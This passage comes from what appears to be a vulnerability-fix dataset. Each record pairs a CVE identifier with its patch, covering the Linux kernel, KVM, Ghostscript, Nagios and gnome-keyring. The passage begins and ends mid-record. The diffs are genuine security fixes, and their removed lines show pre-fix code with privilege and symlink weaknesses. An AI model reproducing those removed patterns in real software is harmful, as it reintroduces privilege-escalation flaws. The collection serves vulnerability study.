Hook up the TTL cache option\n\n * So that when the gsettings gpg-cache-method is 'idle' or 'timeout'\n   we use gpg-cache-ttl to control how long the passphrase is cached\n   for.\n * This is a regression from 3.3.x\n\nhttps:\/\/bugzilla.gnome.org\/show_bug.cgi?id=681081\n---\n daemon\/gpg-agent\/gkd-gpg-agent-ops.c | 40 +++++++++++++++++-----------\n 1 file changed, 25 insertions(+), 15 deletions(-)\n\n","diff_code":"diff --git a\/daemon\/gpg-agent\/gkd-gpg-agent-ops.c b\/daemon\/gpg-agent\/gkd-gpg-agent-ops.c\nindex a0e87314..c8414fea 100644\n--- a\/daemon\/gpg-agent\/gkd-gpg-agent-ops.c\n+++ b\/daemon\/gpg-agent\/gkd-gpg-agent-ops.c\n@@ -322,17 +322,6 @@ load_unlock_options (GcrPrompt *prompt)\n \tg_free (method);\n }\n \n-static void\n-save_unlock_options (GcrPrompt *prompt)\n-{\n-\tGSettings *settings;\n-\n-\tsettings = gkd_gpg_agent_settings ();\n-\n-\tif (gcr_prompt_get_choice_chosen (prompt))\n-\t\tg_settings_set_string (settings, \"gpg-cache-method\", GCR_UNLOCK_OPTION_ALWAYS);\n-}\n-\n static GcrPrompt *\n open_password_prompt (GckSession *session,\n                       const gchar *keyid,\n@@ -405,11 +394,14 @@ do_get_password (GckSession *session, const gchar *keyid, const gchar *errmsg,\n                  const gchar *prompt_text, const gchar *description, gboolean confirm)\n {\n \tGckBuilder builder = GCK_BUILDER_INIT;\n+\tGSettings *settings;\n \tGckAttributes *attrs;\n \tgchar *password = NULL;\n \tGcrPrompt *prompt;\n \tgboolean chosen;\n \tGError *error = NULL;\n+\tgint lifetime;\n+\tgchar *method;\n \n \tg_assert (GCK_IS_SESSION (session));\n \n@@ -430,21 +422,39 @@ do_get_password (GckSession *session, const gchar *keyid, const gchar *errmsg,\n \t}\n \n \tif (password != NULL && keyid != NULL) {\n+\t\tsettings = gkd_gpg_agent_settings ();\n \n \t\t\/* Load up the save options *\/\n \t\tchosen = gcr_prompt_get_choice_chosen (prompt);\n \n-\t\tif (chosen)\n+\t\tif (chosen) {\n+\t\t\tg_settings_set_string (settings, \"gpg-cache-method\", GCR_UNLOCK_OPTION_ALWAYS);\n \t\t\tgck_builder_add_string (&builder, CKA_G_COLLECTION, \"login\");\n-\t\telse\n+\n+\t\t} else {\n+\t\t\tmethod = g_settings_get_string (settings, \"gpg-cache-method\");\n+\t\t\tlifetime = g_settings_get_int (settings, \"gpg-cache-ttl\");\n+\n+\t\t\tif (g_strcmp0 (method, GCR_UNLOCK_OPTION_IDLE) == 0) {\n+\t\t\t\tgck_builder_add_boolean (&builder, CKA_GNOME_TRANSIENT, TRUE);\n+\t\t\t\tgck_builder_add_ulong (&builder, CKA_G_DESTRUCT_IDLE, lifetime);\n+\n+\t\t\t} else if (g_strcmp0 (method, GCR_UNLOCK_OPTION_TIMEOUT) == 0) {\n+\t\t\t\tgck_builder_add_boolean (&builder, CKA_GNOME_TRANSIENT, TRUE);\n+\t\t\t\tgck_builder_add_ulong (&builder, CKA_G_DESTRUCT_AFTER, lifetime);\n+\n+\t\t\t} else if (g_strcmp0 (method, GCR_UNLOCK_OPTION_SESSION)){\n+\t\t\t\tg_message (\"Unsupported gpg-cache-method setting: %s\", method);\n+\t\t\t}\n+\n \t\t\tgck_builder_add_string (&builder, CKA_G_COLLECTION, \"session\");\n+\t\t\tg_free (method);\n+\t\t}\n \n \t\t\/* Now actually save the password *\/\n \t\tattrs = gck_attributes_ref_sink (gck_builder_end (&builder));\n \t\tdo_save_password (session, keyid, description, password, attrs);\n \t\tgck_attributes_unref (attrs);\n-\n-\t\tsave_unlock_options (prompt);\n \t}\n \n \tg_clear_object (&prompt);\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-1957","CWE_ID":"264","category":"security","commit_id":"132c94e31b8bca8ea921f9f96a57d684fa4ae0a9","commit_message":"From 132c94e31b8bca8ea921f9f96a57d684fa4ae0a9 Mon Sep 17 00:00:00 2001\nFrom: \"Eric W. Biederman\" <ebiederm@xmission.com>\nDate: Fri, 22 Mar 2013 04:08:05 -0700\nSubject: vfs: Carefully propogate mounts across user namespaces\n\nAs a matter of policy MNT_READONLY should not be changable if the\noriginal mounter had more privileges than creator of the mount\nnamespace.\n\nAdd the flag CL_UNPRIVILEGED to note when we are copying a mount from\na mount namespace that requires more privileges to a mount namespace\nthat requires fewer privileges.\n\nWhen the CL_UNPRIVILEGED flag is set cause clone_mnt to set MNT_NO_REMOUNT\nif any of the mnt flags that should never be changed are set.\n\nThis protects both mount propagation and the initial creation of a less\nprivileged mount namespace.\n\nCc: stable@vger.kernel.org\nAcked-by: Serge Hallyn <serge.hallyn@canonical.com>\nReported-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\n---\n fs\/namespace.c | 6 +++++-\n fs\/pnode.c     | 6 ++++++\n fs\/pnode.h     | 1 +\n 3 files changed, 12 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/fs\/namespace.c b\/fs\/namespace.c\nindex 8505b5ece5de..968d4c5eae03 100644\n--- a\/fs\/namespace.c\n+++ b\/fs\/namespace.c\n@@ -798,6 +798,10 @@ static struct mount *clone_mnt(struct mount *old, struct dentry *root,\n \t}\n \n \tmnt->mnt.mnt_flags = old->mnt.mnt_flags & ~MNT_WRITE_HOLD;\n+\t\/* Don't allow unprivileged users to change mount flags *\/\n+\tif ((flag & CL_UNPRIVILEGED) && (mnt->mnt.mnt_flags & MNT_READONLY))\n+\t\tmnt->mnt.mnt_flags |= MNT_LOCK_READONLY;\n+\n \tatomic_inc(&sb->s_active);\n \tmnt->mnt.mnt_sb = sb;\n \tmnt->mnt.mnt_root = dget(root);\n@@ -2342,7 +2346,7 @@ static struct mnt_namespace *dup_mnt_ns(struct mnt_namespace *mnt_ns,\n \t\/* First pass: copy the tree topology *\/\n \tcopy_flags = CL_COPY_ALL | CL_EXPIRE;\n \tif (user_ns != mnt_ns->user_ns)\n-\t\tcopy_flags |= CL_SHARED_TO_SLAVE;\n+\t\tcopy_flags |= CL_SHARED_TO_SLAVE | CL_UNPRIVILEGED;\n \tnew = copy_tree(old, old->mnt.mnt_root, copy_flags);\n \tif (IS_ERR(new)) {\n \t\tup_write(&namespace_sem);\ndiff --git a\/fs\/pnode.c b\/fs\/pnode.c\nindex 3e000a51ac0d..8b29d2164da6 100644\n--- a\/fs\/pnode.c\n+++ b\/fs\/pnode.c\n@@ -9,6 +9,7 @@\n #include <linux\/mnt_namespace.h>\n #include <linux\/mount.h>\n #include <linux\/fs.h>\n+#include <linux\/nsproxy.h>\n #include \"internal.h\"\n #include \"pnode.h\"\n \n@@ -220,6 +221,7 @@ static struct mount *get_source(struct mount *dest,\n int propagate_mnt(struct mount *dest_mnt, struct dentry *dest_dentry,\n \t\t    struct mount *source_mnt, struct list_head *tree_list)\n {\n+\tstruct user_namespace *user_ns = current->nsproxy->mnt_ns->user_ns;\n \tstruct mount *m, *child;\n \tint ret = 0;\n \tstruct mount *prev_dest_mnt = dest_mnt;\n@@ -237,6 +239,10 @@ int propagate_mnt(struct mount *dest_mnt, struct dentry *dest_dentry,\n \n \t\tsource =  get_source(m, prev_dest_mnt, prev_src_mnt, &type);\n \n+\t\t\/* Notice when we are propagating across user namespaces *\/\n+\t\tif (m->mnt_ns->user_ns != user_ns)\n+\t\t\ttype |= CL_UNPRIVILEGED;\n+\n \t\tchild = copy_tree(source, source->mnt.mnt_root, type);\n \t\tif (IS_ERR(child)) {\n \t\t\tret = PTR_ERR(child);\ndiff --git a\/fs\/pnode.h b\/fs\/pnode.h\nindex 19b853a3445c..a0493d5ebfbf 100644\n--- a\/fs\/pnode.h\n+++ b\/fs\/pnode.h\n@@ -23,6 +23,7 @@\n #define CL_MAKE_SHARED \t\t0x08\n #define CL_PRIVATE \t\t0x10\n #define CL_SHARED_TO_SLAVE\t0x20\n+#define CL_UNPRIVILEGED\t\t0x40\n \n static inline void set_mnt_shared(struct mount *mnt)\n {\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2018-16802","CWE_ID":"264","category":"security","commit_id":"643b24dbd002fb9c131313253c307cf3951b3d47","commit_message":"From 643b24dbd002fb9c131313253c307cf3951b3d47 Mon Sep 17 00:00:00 2001\nFrom: Chris Liddell <chris.liddell@artifex.com>\nDate: Fri, 7 Sep 2018 08:07:12 +0100\nSubject: [PATCH] Bug 699718(2): Improve\/augment stack size checking\n\nImprove the rebustness of the previous solution (previously it could trigger an\nerror when there *was* stack capacity available).\n\nRemove redundant check: we don't need to check if the *current* stack size is\nsufficient, before checking the maximum permitted stack size.\n\nAlso check the exec stack, as execstackoverflow can also cause the\nPostscript call out to fail.\n\nLastly, in event of failure, put the LockSafetyParams flag back in the existing\ndevice (this is only necessary because we don't enfore JOBSERVER mode).\n\nNote: the Postscript callout (%grestorepagedevice) never pushes any dictionaries\non the dict stack - if that changes, we should check that stack, too.\n---\n psi\/zdevice2.c | 17 ++++++++++++-----\n 1 file changed, 12 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/psi\/zdevice2.c b\/psi\/zdevice2.c\nindex 5447c8c..159a0c0 100644\n--- a\/psi\/zdevice2.c\n+++ b\/psi\/zdevice2.c\n@@ -278,8 +278,8 @@ restore_page_device(i_ctx_t *i_ctx_p, const gs_gstate * pgs_old, const gs_gstate\n     }\n \n     if (LockSafetyParams && !samepagedevice) {\n-        os_ptr op = osp;\n-        const int max_ops = 512;\n+        const int required_ops = 512;\n+        const int required_es = 32;\n \n         \/* The %grestorepagedevice must complete: the biggest danger\n            is operand stack overflow. As we use get\/putdeviceparams\n@@ -289,9 +289,16 @@ restore_page_device(i_ctx_t *i_ctx_p, const gs_gstate * pgs_old, const gs_gstate\n            424 entries on the op stack. Allowing for working stack\n            space, and safety margin.....\n          *\/\n-        if (max_ops > op - osbot) {\n-            if (max_ops >= ref_stack_count(&o_stack))\n-               return_error(gs_error_stackoverflow);\n+        if (required_ops + ref_stack_count(&o_stack) >= ref_stack_max_count(&o_stack)) {\n+           gs_currentdevice(pgs_old)->LockSafetyParams = LockSafetyParams;\n+           return_error(gs_error_stackoverflow);\n+        }\n+        \/* We also want enough exec stack space - 32 is an overestimate of\n+           what we need to complete the Postscript call out.\n+         *\/\n+        if (required_es + ref_stack_count(&e_stack) >= ref_stack_max_count(&e_stack)) {\n+           gs_currentdevice(pgs_old)->LockSafetyParams = LockSafetyParams;\n+           return_error(gs_error_execstackoverflow);\n         }\n     }\n     \/*\n-- \n2.9.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"2ea1d13f64efdf49319e86c87d9ba38c30902782","commit_message":"From 2ea1d13f64efdf49319e86c87d9ba38c30902782 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Mon, 30 Nov 2009 13:06:51 -0500\nSubject: arm: add arch_mmap_check(), get rid of sys_arm_mremap()\n\nAcked-by: Russell King <rmk+kernel@arm.linux.org.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n arch\/arm\/include\/asm\/mman.h |  3 +++\n arch\/arm\/kernel\/calls.S     |  2 +-\n arch\/arm\/kernel\/sys_arm.c   | 25 -------------------------\n 3 files changed, 4 insertions(+), 26 deletions(-)\n\n","diff_code":"diff --git a\/arch\/arm\/include\/asm\/mman.h b\/arch\/arm\/include\/asm\/mman.h\nindex 8eebf89f5ab1..41f99c573b93 100644\n--- a\/arch\/arm\/include\/asm\/mman.h\n+++ b\/arch\/arm\/include\/asm\/mman.h\n@@ -1 +1,4 @@\n #include <asm-generic\/mman.h>\n+\n+#define arch_mmap_check(addr, len, flags) \\\n+\t(((flags) & MAP_FIXED && (addr) < FIRST_USER_ADDRESS) ? -EINVAL : 0)\ndiff --git a\/arch\/arm\/kernel\/calls.S b\/arch\/arm\/kernel\/calls.S\nindex f58c1156e779..9314a2d681f1 100644\n--- a\/arch\/arm\/kernel\/calls.S\n+++ b\/arch\/arm\/kernel\/calls.S\n@@ -172,7 +172,7 @@\n \/* 160 *\/\tCALL(sys_sched_get_priority_min)\n \t\tCALL(sys_sched_rr_get_interval)\n \t\tCALL(sys_nanosleep)\n-\t\tCALL(sys_arm_mremap)\n+\t\tCALL(sys_mremap)\n \t\tCALL(sys_setresuid16)\n \/* 165 *\/\tCALL(sys_getresuid16)\n \t\tCALL(sys_ni_syscall)\t\t\/* vm86 *\/\ndiff --git a\/arch\/arm\/kernel\/sys_arm.c b\/arch\/arm\/kernel\/sys_arm.c\nindex 78ecaac65206..3b897444a9bd 100644\n--- a\/arch\/arm\/kernel\/sys_arm.c\n+++ b\/arch\/arm\/kernel\/sys_arm.c\n@@ -28,10 +28,6 @@\n #include <linux\/ipc.h>\n #include <linux\/uaccess.h>\n \n-extern unsigned long do_mremap(unsigned long addr, unsigned long old_len,\n-\t\t\t       unsigned long new_len, unsigned long flags,\n-\t\t\t       unsigned long new_addr);\n-\n \/* common code for old and new mmaps *\/\n inline long do_mmap2(\n \tunsigned long addr, unsigned long len,\n@@ -43,9 +39,6 @@ inline long do_mmap2(\n \n \tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n \n-\tif (flags & MAP_FIXED && addr < FIRST_USER_ADDRESS)\n-\t\tgoto out;\n-\n \terror = -EBADF;\n \tif (!(flags & MAP_ANONYMOUS)) {\n \t\tfile = fget(fd);\n@@ -89,24 +82,6 @@ out:\n \treturn error;\n }\n \n-asmlinkage unsigned long\n-sys_arm_mremap(unsigned long addr, unsigned long old_len,\n-\t       unsigned long new_len, unsigned long flags,\n-\t       unsigned long new_addr)\n-{\n-\tunsigned long ret = -EINVAL;\n-\n-\tif (flags & MREMAP_FIXED && new_addr < FIRST_USER_ADDRESS)\n-\t\tgoto out;\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\tret = do_mremap(addr, old_len, new_len, flags, new_addr);\n-\tup_write(&current->mm->mmap_sem);\n-\n-out:\n-\treturn ret;\n-}\n-\n \/*\n  * Perform the select(nd, in, out, ex, tv) and mmap() system\n  * calls.\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-6383","CWE_ID":"264","category":"security","commit_id":"f856567b930dfcdbc3323261bf77240ccdde01f5","commit_message":"From f856567b930dfcdbc3323261bf77240ccdde01f5 Mon Sep 17 00:00:00 2001\nFrom: Dan Carpenter <dan.carpenter@oracle.com>\nDate: Tue, 29 Oct 2013 22:11:06 +0300\nSubject: aacraid: missing capable() check in compat ioctl\n\nIn commit d496f94d22d1 ('[SCSI] aacraid: fix security weakness') we\nadded a check on CAP_SYS_RAWIO to the ioctl.  The compat ioctls need the\ncheck as well.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n drivers\/scsi\/aacraid\/linit.c | 2 ++\n 1 file changed, 2 insertions(+)\n\n","diff_code":"diff --git a\/drivers\/scsi\/aacraid\/linit.c b\/drivers\/scsi\/aacraid\/linit.c\nindex 408a42ef787a..f0d432c139d0 100644\n--- a\/drivers\/scsi\/aacraid\/linit.c\n+++ b\/drivers\/scsi\/aacraid\/linit.c\n@@ -771,6 +771,8 @@ static long aac_compat_do_ioctl(struct aac_dev *dev, unsigned cmd, unsigned long\n static int aac_compat_ioctl(struct scsi_device *sdev, int cmd, void __user *arg)\n {\n \tstruct aac_dev *dev = (struct aac_dev *)sdev->host->hostdata;\n+\tif (!capable(CAP_SYS_RAWIO))\n+\t\treturn -EPERM;\n \treturn aac_compat_do_ioctl(dev, cmd, (unsigned long)arg);\n }\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2018-16509","CWE_ID":"264","category":"security","commit_id":"79cccf641486a6595c43f1de1cd7ade696020a31","commit_message":"From 79cccf641486a6595c43f1de1cd7ade696020a31 Mon Sep 17 00:00:00 2001\nFrom: Chris Liddell <chris.liddell@artifex.com>\nDate: Sat, 25 Aug 2018 07:45:45 +0100\nSubject: [PATCH] Bug 699654(2): preserve LockSafetyParams in the nulldevice\n\nThe nulldevice does not necessarily use the normal setpagedevice machinery,\nbut can be set using the nulldevice operator. In which case, we don't preserve\nthe settings from the original device (in the way setpagedevice does).\n\nSince nulldevice does nothing, this is not generally a problem, but in the case\nof LockSafetyParams it *is* important when we restore back to the original\ndevice, when LockSafetyParams not being set is \"preserved\" into the post-\nrestore configuration.\n\nWe have to initialise the value to false because the nulldevice is used during\ninitialisation (before any other device exists), and *must* be writable for\nthat.\n---\n base\/gsdevice.c | 5 ++++-\n 1 file changed, 4 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/base\/gsdevice.c b\/base\/gsdevice.c\nindex 0659220..e38086d 100644\n--- a\/base\/gsdevice.c\n+++ b\/base\/gsdevice.c\n@@ -691,7 +691,7 @@ int\n gs_nulldevice(gs_gstate * pgs)\n {\n     int code = 0;\n-\n+    bool saveLockSafety = false;\n     if (pgs->device == 0 || !gx_device_is_null(pgs->device)) {\n         gx_device *ndev;\n         code = gs_copydevice(&ndev, (const gx_device *)&gs_null_device,\n@@ -699,6 +699,8 @@ gs_nulldevice(gs_gstate * pgs)\n \n         if (code < 0)\n             return code;\n+        if (gs_currentdevice_inline(pgs) != NULL)\n+            saveLockSafety = gs_currentdevice_inline(pgs)->LockSafetyParams;\n         \/*\n          * Internal devices have a reference count of 0, not 1,\n          * aside from references from graphics states.\n@@ -718,6 +720,7 @@ gs_nulldevice(gs_gstate * pgs)\n \n         if ((code = gs_setdevice_no_erase(pgs, ndev)) < 0)\n             gs_free_object(pgs->memory, ndev, \"gs_copydevice(device)\");\n+        gs_currentdevice_inline(pgs)->LockSafetyParams = saveLockSafety;\n     }\n     return code;\n }\n-- \n2.9.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-4470","CWE_ID":"264","category":"security","commit_id":"c547dbf55d5f8cf615ccc0e7265e98db27d3fb8b","commit_message":"From c547dbf55d5f8cf615ccc0e7265e98db27d3fb8b Mon Sep 17 00:00:00 2001\nFrom: Jiri Pirko <jiri@resnulli.us>\nDate: Sat, 19 Oct 2013 12:29:16 +0200\nSubject: ip6_output: do skb ufo init for peeked non ufo skb as well\n\nNow, if user application does:\nsendto len<mtu flag MSG_MORE\nsendto len>mtu flag 0\nThe skb is not treated as fragmented one because it is not initialized\nthat way. So move the initialization to fix this.\n\nintroduced by:\ncommit e89e9cf539a28df7d0eb1d0a545368e9920b34ac \"[IPv4\/IPv6]: UFO Scatter-gather approach\"\n\nSigned-off-by: Jiri Pirko <jiri@resnulli.us>\nAcked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/ipv6\/ip6_output.c | 25 ++++++++++++++-----------\n 1 file changed, 14 insertions(+), 11 deletions(-)\n\n","diff_code":"diff --git a\/net\/ipv6\/ip6_output.c b\/net\/ipv6\/ip6_output.c\nindex a54c45ce4a48..975624b8d2ea 100644\n--- a\/net\/ipv6\/ip6_output.c\n+++ b\/net\/ipv6\/ip6_output.c\n@@ -1008,6 +1008,7 @@ static inline int ip6_ufo_append_data(struct sock *sk,\n \n {\n \tstruct sk_buff *skb;\n+\tstruct frag_hdr fhdr;\n \tint err;\n \n \t\/* There is support for UDP large send offload by network\n@@ -1015,8 +1016,6 @@ static inline int ip6_ufo_append_data(struct sock *sk,\n \t * udp datagram\n \t *\/\n \tif ((skb = skb_peek_tail(&sk->sk_write_queue)) == NULL) {\n-\t\tstruct frag_hdr fhdr;\n-\n \t\tskb = sock_alloc_send_skb(sk,\n \t\t\thh_len + fragheaderlen + transhdrlen + 20,\n \t\t\t(flags & MSG_DONTWAIT), &err);\n@@ -1036,20 +1035,24 @@ static inline int ip6_ufo_append_data(struct sock *sk,\n \t\tskb->transport_header = skb->network_header + fragheaderlen;\n \n \t\tskb->protocol = htons(ETH_P_IPV6);\n-\t\tskb->ip_summed = CHECKSUM_PARTIAL;\n \t\tskb->csum = 0;\n \n-\t\t\/* Specify the length of each IPv6 datagram fragment.\n-\t\t * It has to be a multiple of 8.\n-\t\t *\/\n-\t\tskb_shinfo(skb)->gso_size = (mtu - fragheaderlen -\n-\t\t\t\t\t     sizeof(struct frag_hdr)) & ~7;\n-\t\tskb_shinfo(skb)->gso_type = SKB_GSO_UDP;\n-\t\tipv6_select_ident(&fhdr, rt);\n-\t\tskb_shinfo(skb)->ip6_frag_id = fhdr.identification;\n \t\t__skb_queue_tail(&sk->sk_write_queue, skb);\n+\t} else if (skb_is_gso(skb)) {\n+\t\tgoto append;\n \t}\n \n+\tskb->ip_summed = CHECKSUM_PARTIAL;\n+\t\/* Specify the length of each IPv6 datagram fragment.\n+\t * It has to be a multiple of 8.\n+\t *\/\n+\tskb_shinfo(skb)->gso_size = (mtu - fragheaderlen -\n+\t\t\t\t     sizeof(struct frag_hdr)) & ~7;\n+\tskb_shinfo(skb)->gso_type = SKB_GSO_UDP;\n+\tipv6_select_ident(&fhdr, rt);\n+\tskb_shinfo(skb)->ip6_frag_id = fhdr.identification;\n+\n+append:\n \treturn skb_append_datato_frags(sk, skb, getfrag, from,\n \t\t\t\t       (length - transhdrlen));\n }\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-9566","CWE_ID":"264","category":"security","commit_id":"ff22fd0de4938781edcbd48512d2494ca3c9c41a","commit_message":"From ff22fd0de4938781edcbd48512d2494ca3c9c41a Mon Sep 17 00:00:00 2001\nFrom: \"John C. Frickson\" <jfrickson@nagios.com>\nDate: Wed, 23 Nov 2016 09:22:55 -0600\nSubject: [PATCH 1\/2] Fixed another root privilege escalation (CVE-2016-9566)\n\n---\n Changelog      |  6 ++++++\n THANKS         |  1 +\n base\/logging.c | 50 ++++++++++++++++++++++++++++++++++++++++++++------\n 3 files changed, 51 insertions(+), 6 deletions(-)\n\nFrom 8e6e1cb29f3c1b933b0e13fb937ad5ca8b448ccc Mon Sep 17 00:00:00 2001\nFrom: \"John C. Frickson\" <jfrickson@nagios.com>\nDate: Tue, 29 Nov 2016 09:37:53 -0600\nSubject: [PATCH 2\/2] Wrong filename variable used\n\n---\n base\/logging.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/Changelog b\/Changelog\nindex 44b8ac7b..000df72c 100644\n--- a\/Changelog\n+++ b\/Changelog\n@@ -2,6 +2,12 @@\n Nagios Core 4 Change Log\n ########################\n \n+4.2.x - xxxx-xx-xx\n+------------------\n+SECURITY FIXES\n+* Fixed another root privilege escalation (CVE-2016-9566) Thanks for bringing this\n+  to our attention go to Dawid Golunski (http:\/\/legalhackers.com).\n+\n \n 4.2.3 - 2016-11-21\n -------------------\ndiff --git a\/THANKS b\/THANKS\nindex 28c0c761..e4f112ce 100644\n--- a\/THANKS\n+++ b\/THANKS\n@@ -70,6 +70,7 @@ wrong, please let me know.\n * David Kmoch\n * David Schlecht\n * David Tilloy\n+* Dawid Golunski\n * Dean Lane\n * Denis Seleznyov\n * Dennis Biringer\ndiff --git a\/base\/logging.c b\/base\/logging.c\nindex fe29bc0e..bca1c6f3 100644\n--- a\/base\/logging.c\n+++ b\/base\/logging.c\n@@ -112,17 +112,39 @@ static void write_to_all_logs_with_timestamp(char *buffer, unsigned long data_ty\n \n static FILE *open_log_file(void)\n {\n+\tint fh;\n+\tstruct stat st;\n+\n \tif(log_fp) \/* keep it open unless we rotate *\/\n \t\treturn log_fp;\n \n-\tlog_fp = fopen(log_file, \"a+\");\n+\tif ((fh = open(log_file, O_RDWR|O_APPEND|O_CREAT|O_NOFOLLOW, S_IRUSR|S_IWUSR)) == -1) {\n+\t\tif (daemon_mode == FALSE)\n+\t\t\tprintf(\"Warning: Cannot open log file '%s' for writing\\n\", log_file);\n+\t\treturn NULL;\n+\t}\n+\tlog_fp = fdopen(fh, \"a+\");\n \tif(log_fp == NULL) {\n-\t\tif (daemon_mode == FALSE) {\n+\t\tif (daemon_mode == FALSE)\n \t\t\tprintf(\"Warning: Cannot open log file '%s' for writing\\n\", log_file);\n-\t\t\t}\n \t\treturn NULL;\n \t\t}\n \n+\tif ((fstat(fh, &st)) == -1) {\n+\t\tlog_fp = NULL;\n+\t\tclose(fh);\n+\t\tif (daemon_mode == FALSE)\n+\t\t\tprintf(\"Warning: Cannot fstat log file '%s'\\n\", log_file);\n+\t\treturn NULL;\n+\t}\n+\tif (st.st_nlink != 1 || (st.st_mode & S_IFMT) != S_IFREG) {\n+\t\tlog_fp = NULL;\n+\t\tclose(fh);\n+\t\tif (daemon_mode == FALSE)\n+\t\t\tprintf(\"Warning: log file '%s' has an invalid mode\\n\", log_file);\n+\t\treturn NULL;\n+\t}\n+\n \t(void)fcntl(fileno(log_fp), F_SETFD, FD_CLOEXEC);\n \treturn log_fp;\n }\n@@ -447,7 +469,10 @@ int write_log_file_info(time_t *timestamp) {\n \n \n \/* opens the debug log for writing *\/\n-int open_debug_log(void) {\n+int open_debug_log(void)\n+{\n+\tint fh;\n+\tstruct stat st;\n \n \t\/* don't do anything if we're not actually running... *\/\n \tif(verify_config || test_scheduling == TRUE)\n@@ -457,10 +482,23 @@ int open_debug_log(void) {\n \tif(debug_level == DEBUGL_NONE)\n \t\treturn OK;\n \n-\tif((debug_file_fp = fopen(debug_file, \"a+\")) == NULL)\n+\tif ((fh = open(log_file, O_RDWR|O_APPEND|O_CREAT|O_NOFOLLOW, S_IRUSR|S_IWUSR)) == -1)\n+\t\treturn ERROR;\n+\tif((debug_file_fp = fdopen(fh, \"a+\")) == NULL)\n+\t\treturn ERROR;\n+\n+\tif ((fstat(fh, &st)) == -1) {\n+\t\tdebug_file_fp = NULL;\n+\t\tclose(fh);\n+\t\treturn ERROR;\n+\t}\n+\tif (st.st_nlink != 1 || (st.st_mode & S_IFMT) != S_IFREG) {\n+\t\tdebug_file_fp = NULL;\n+\t\tclose(fh);\n \t\treturn ERROR;\n+\t}\n \n-\t(void)fcntl(fileno(debug_file_fp), F_SETFD, FD_CLOEXEC);\n+\t(void)fcntl(fh, F_SETFD, FD_CLOEXEC);\n \n \treturn OK;\n \t}\n\ndiff --git a\/base\/logging.c b\/base\/logging.c\nindex bca1c6f3..96c3d97f 100644\n--- a\/base\/logging.c\n+++ b\/base\/logging.c\n@@ -482,7 +482,7 @@ int open_debug_log(void)\n \tif(debug_level == DEBUGL_NONE)\n \t\treturn OK;\n \n-\tif ((fh = open(log_file, O_RDWR|O_APPEND|O_CREAT|O_NOFOLLOW, S_IRUSR|S_IWUSR)) == -1)\n+\tif ((fh = open(debug_file, O_RDWR|O_APPEND|O_CREAT|O_NOFOLLOW, S_IRUSR|S_IWUSR)) == -1)\n \t\treturn ERROR;\n \tif((debug_file_fp = fdopen(fh, \"a+\")) == NULL)\n \t\treturn ERROR;\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-3647","CWE_ID":"264","category":"security","commit_id":"234f3ce485d54017f15cf5e0699cff4100121601","commit_message":"From 234f3ce485d54017f15cf5e0699cff4100121601 Mon Sep 17 00:00:00 2001\nFrom: Nadav Amit <namit@cs.technion.ac.il>\nDate: Thu, 18 Sep 2014 22:39:38 +0300\nSubject: KVM: x86: Emulator fixes for eip canonical checks on near branches\n\nBefore changing rip (during jmp, call, ret, etc.) the target should be asserted\nto be canonical one, as real CPUs do.  During sysret, both target rsp and rip\nshould be canonical. If any of these values is noncanonical, a #GP exception\nshould occur.  The exception to this rule are syscall and sysenter instructions\nin which the assigned rip is checked during the assignment to the relevant\nMSRs.\n\nThis patch fixes the emulator to behave as real CPUs do for near branches.\nFar branches are handled by the next patch.\n\nThis fixes CVE-2014-3647.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Nadav Amit <namit@cs.technion.ac.il>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n arch\/x86\/kvm\/emulate.c | 78 ++++++++++++++++++++++++++++++++++----------------\n 1 file changed, 54 insertions(+), 24 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/kvm\/emulate.c b\/arch\/x86\/kvm\/emulate.c\nindex 047698974799..a1b9139169f6 100644\n--- a\/arch\/x86\/kvm\/emulate.c\n+++ b\/arch\/x86\/kvm\/emulate.c\n@@ -564,7 +564,8 @@ static int emulate_nm(struct x86_emulate_ctxt *ctxt)\n \treturn emulate_exception(ctxt, NM_VECTOR, 0, false);\n }\n \n-static inline void assign_eip_near(struct x86_emulate_ctxt *ctxt, ulong dst)\n+static inline int assign_eip_far(struct x86_emulate_ctxt *ctxt, ulong dst,\n+\t\t\t       int cs_l)\n {\n \tswitch (ctxt->op_bytes) {\n \tcase 2:\n@@ -574,16 +575,25 @@ static inline void assign_eip_near(struct x86_emulate_ctxt *ctxt, ulong dst)\n \t\tctxt->_eip = (u32)dst;\n \t\tbreak;\n \tcase 8:\n+\t\tif ((cs_l && is_noncanonical_address(dst)) ||\n+\t\t    (!cs_l && (dst & ~(u32)-1)))\n+\t\t\treturn emulate_gp(ctxt, 0);\n \t\tctxt->_eip = dst;\n \t\tbreak;\n \tdefault:\n \t\tWARN(1, \"unsupported eip assignment size\\n\");\n \t}\n+\treturn X86EMUL_CONTINUE;\n+}\n+\n+static inline int assign_eip_near(struct x86_emulate_ctxt *ctxt, ulong 